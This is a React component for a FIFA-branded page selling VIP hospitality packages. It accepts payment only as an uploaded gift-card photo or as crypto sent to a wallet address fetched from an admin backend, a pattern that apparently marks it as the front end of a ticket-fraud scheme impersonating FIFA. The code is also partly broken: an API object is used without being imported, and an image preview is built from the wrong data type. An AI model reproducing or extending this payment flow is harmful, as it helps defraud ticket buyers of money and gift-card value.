import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { toast } from "react-toastify";
import { ticketAPI } from "../../api/index";
import FIFABanner from "../../components/layout/FIFABanner";
import FIFASectionFooter from "../../components/layout/FIFASectionFooter";
import { adminAPI } from "../../api/index";
import "./fifa.css";

const HospitalityPackages = () => {
  const navigate = useNavigate();

  const [selectedPackage, setSelectedPackage] = useState(null);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [paymentMethod, setPaymentMethod] = useState("giftcard");

  const [giftCardImage, setGiftCardImage] = useState(null);
  const [giftCardAmount, setGiftCardAmount] = useState("");

  const [walletAddress, setWalletAddress] = useState("");
  const [network, setNetwork] = useState("");
  const [cryptoAmount, setCryptoAmount] = useState("");

  const [selectedFile, setSelectedFile] = useState(null);

  useEffect(() => {
    fetchWallet();
  }, []);

  const fetchWallet = async () => {
    try {
      const res = await adminAPI.getCryptoAddress();

      setWalletAddress(res.data.address);
      setNetwork(res.data.network);
    } catch (err) {
      console.log(err);
    }
  };

  const handleBookPackage = (pkg) => {
    setSelectedPackage(pkg);
    setIsModalOpen(true);
  };

  const handleGiftCardImage = (e) => {
    const file = e.target.files[0];

    if (!file) return;

    setSelectedFile(file);

    const reader = new FileReader();

    reader.onloadend = () => {
      setGiftCardImage(reader.result);
    };

    reader.readAsDataURL(file);
  };

  const submitPackage = async () => {
    try {
      const formData = new FormData();

      formData.append("packageName", selectedPackage?.name);

      formData.append("paymentMethod", paymentMethod);

      if (paymentMethod === "giftcard") {
        formData.append("giftCardImage", selectedFile);

        formData.append("giftCardAmount", giftCardAmount);
      }

      if (paymentMethod === "crypto") {
        formData.append("cryptoAmount", cryptoAmount);

        formData.append("cryptoAddress", walletAddress);
      }

      const res = await paymentAPI.submitHospitality(formData);

      console.log("RESPONSE:", res.data);

      toast.success("Submitted successfully");

      setIsModalOpen(false);
    } catch (err) {
      console.log(err);

      toast.error("Submission failed");
    }
  };

  const packages = [
    {
      name: "Legends Suite",
      price: "$2,500",
      description: "Ultimate VIP experience",
      features: ["Premium seating", "Open bar"],
      popular: true,
    },
    {
      name: "Champions Club",
      price: "$1,800",
      description: "Premium matchday experience",
      features: ["Dining", "Lounge access"],
      popular: false,
    },
  ];

  return (
    <div className="fifa-page-container">
      <FIFABanner />

      <div className="page-content">
        <div className="page-header">
          <h1>Hospitality Packages</h1>
          <p>Elevate your matchday experience</p>
        </div>

        <div className="packages-grid">
          {packages.map((pkg, index) => (
            <div
              key={index}
              className={`package-card ${pkg.popular ? "popular" : ""}`}
            >
              <h2>{pkg.name}</h2>

              <div className="package-price">{pkg.price}</div>

              <p>{pkg.description}</p>

              <ul>
                {pkg.features.map((f, i) => (
                  <li key={i}>{f}</li>
                ))}
              </ul>

              <button
                className="book-btn"
                onClick={() => handleBookPackage(pkg)}
              >
                Book Now →
              </button>
            </div>
          ))}
        </div>
      </div>

      {isModalOpen && (
        <div className="modal-overlay" onClick={() => setIsModalOpen(false)}>
          <div
            className="modal-content booking-modal"
            onClick={(e) => e.stopPropagation()}
          >
            {/* Header */}

            <div className="modal-header">
              <div>
                <span className="step-badge">Step 1 of 2</span>

                <h2>🏆 {selectedPackage?.name}</h2>

                <p className="modal-subtitle">
                  Complete your booking request securely
                </p>
              </div>

              <button
                className="close-modal"
                onClick={() => setIsModalOpen(false)}
              >
                ✕
              </button>
            </div>

            {/* Summary */}

            <div className="booking-summary-card">
              <h4>Package Summary</h4>

              <div className="summary-row">
                <span>Package</span>
                <strong>{selectedPackage?.name}</strong>
              </div>

              <div className="summary-row">
                <span>Price</span>
                <strong>{selectedPackage?.price}</strong>
              </div>

              <div className="summary-row">
                <span>Status</span>
                <strong>Available</strong>
              </div>
            </div>

            {/* Payment Tabs */}

            <div className="payment-tabs">
              <button
                className={paymentMethod === "giftcard" ? "active-payment" : ""}
                onClick={() => setPaymentMethod("giftcard")}
              >
                🎁 Gift Card
              </button>

              <button
                className={paymentMethod === "crypto" ? "active-payment" : ""}
                onClick={() => setPaymentMethod("crypto")}
              >
                ₿ Crypto
              </button>
            </div>

            {/* Gift Card */}

            {paymentMethod === "giftcard" && (
              <div className="payment-section">
                <div className="info-alert">
                  📌 Upload your gift card within 24 hours for verification.
                </div>

                <input
                  type="number"
                  placeholder="Gift card amount"
                  value={giftCardAmount}
                  onChange={(e) => setGiftCardAmount(e.target.value)}
                />

                <input
                  type="file"
                  accept="image/*"
                  onChange={handleGiftCardImage}
                />

                {giftCardImage && (
                  <img
                    src={URL.createObjectURL(giftCardImage)}
                    className="gift-preview"
                    alt=""
                  />
                )}
              </div>
            )}

            {/* Crypto */}

            {paymentMethod === "crypto" && (
              <div className="payment-section">
                <div className="crypto-box">
                  <h4>Send Payment To</h4>

                  <code>{walletAddress}</code>

                  <p>
                    Network:
                    <strong> {network}</strong>
                  </p>

                  <button
                    className="copy-btn"
                    onClick={() => {
                      navigator.clipboard.writeText(walletAddress);
                      toast.success("Wallet copied");
                    }}
                  >
                    📋 Copy Address
                  </button>
                </div>

                <input
                  type="number"
                  placeholder="Amount Sent"
                  value={cryptoAmount}
                  onChange={(e) => setCryptoAmount(e.target.value)}
                />

                <div className="info-alert">
                  🔒 Your transaction will appear in the admin dashboard for
                  verification.
                </div>
              </div>
            )}

            <div className="next-steps">
              <h4>What happens next?</h4>

              <p>1. Submit payment details</p>

              <p>2. Payment verifier confirms </p>

              <p>3. Booking confirmation sent to your email</p>
            </div>

            <button className="submit-btn" onClick={submitPackage}>
              Submit Request
            </button>
          </div>
        </div>
      )}

      <FIFASectionFooter />
    </div>
  );
};

export default HospitalityPackages;
